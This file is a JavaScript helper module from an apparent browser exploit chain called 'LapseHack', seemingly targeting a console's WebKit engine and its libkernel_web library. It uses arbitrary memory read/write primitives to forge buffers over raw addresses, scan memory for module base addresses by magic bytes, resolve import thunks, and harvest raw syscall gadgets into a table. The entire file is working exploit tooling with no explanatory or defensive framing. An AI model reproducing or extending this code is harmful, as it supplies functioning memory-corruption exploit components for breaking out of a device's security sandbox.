import { Int } from "/LapseHack/module/int64.mjs";
import { mem } from "/LapseHack/module/mem.mjs";
import { align } from "/LapseHack/module/utils.mjs";
import { page_size } from "/LapseHack/module/offset.mjs";
import { BufferView } from "/LapseHack/module/rw.mjs";
import { View1 } from "/LapseHack/module/view.mjs";
import * as off from "/LapseHack/module/offset.mjs";
export function make_buffer(addr, size) {
    const u = new Uint8Array(1001);
    const u_addr = mem.addrof(u);
    const old_addr = u_addr.read64(off.view_m_vector);
    const old_size = u_addr.read32(off.view_m_length);
    u_addr.write64(off.view_m_vector, addr);
    u_addr.write32(off.view_m_length, size);
    const copy = new Uint8Array(u.length);
    copy.set(u);
    const res = copy.buffer;
    u_addr.write64(off.view_m_vector, old_addr);
    u_addr.write32(off.view_m_length, old_size);
    return res;
}
function check_magic_at(p, is_text) {
    const text_magic = [new Int(0xe5894855, 0x56415741), new Int(0x54415541, 0x8d485053)];
    const data_magic = [new Int(0x20), new Int(0x3c13f4bf, 0x2)];
    const magic = is_text ? text_magic : data_magic;
    const value = [p.read64(0), p.read64(8)];
    return value[0].eq(magic[0]) && value[1].eq(magic[1]);
}
export function find_base(addr, is_text, is_back) {
    addr = align(addr, page_size);
    const offset = (is_back ? -1 : 1) * page_size;
    while (true) {
        if (check_magic_at(addr, is_text)) {
            break;
        }
        addr = addr.add(offset);
    }
    return addr;
}
export function get_view_vector(view) {
    if (!ArrayBuffer.isView(view)) {
        throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
    }
    return mem.addrof(view).readp(off.view_m_vector);
}
export function resolve_import(import_addr) {
    if (import_addr.read16(0) !== 0x25ff) {
        throw Error(`instruction at ${import_addr} is not of the form: jmp qword [rip + X]`);
    }
    const disp = import_addr.read32(2);
    const offset = (disp | 0) + 6;
    const function_addr = import_addr.readp(offset);
    return function_addr;
}
export function init_syscall_array(syscall_array, libkernel_web_base, max_search_size) {
    if (!Number.isInteger(max_search_size)) {
        throw TypeError(`max_search_size is not a integer: ${max_search_size}`);
    }
    if (max_search_size < 0) {
        throw Error(`max_search_size is less than 0: ${max_search_size}`);
    }

    const libkernel_web_buffer = make_buffer(libkernel_web_base, max_search_size);
    const kbuf = new BufferView(libkernel_web_buffer);
    let text_size = 0;
    let found = false;
    for (let i = 0; i < max_search_size; i++) {
        if (kbuf[i] === 0x72 && kbuf[i + 1] === 0x64 && kbuf[i + 2] === 0x6c && kbuf[i + 3] === 0x6f) {
            text_size = i;
            found = true;
            break;
        }
    }
    if (!found) {
        throw Error(`"rdlo" string not found in libkernel_web, base address: ${libkernel_web_base}`);
    }

    for (let i = 0; i < text_size; i++) {
        if (kbuf[i] === 0x48 && kbuf[i + 1] === 0xc7 && kbuf[i + 2] === 0xc0 && kbuf[i + 7] === 0x49 && kbuf[i + 8] === 0x89 && kbuf[i + 9] === 0xca && kbuf[i + 10] === 0x0f && kbuf[i + 11] === 0x05) {
            const syscall_num = kbuf.read32(i + 3);
            syscall_array[syscall_num] = libkernel_web_base.add(i);
            i += 11;
        }
    }
}
export function cstr(str) {
    str += "\0";
    return View1.from(str, (c) => c.codePointAt(0));
}

export { jstr } from "/LapseHack/module/utils.mjs";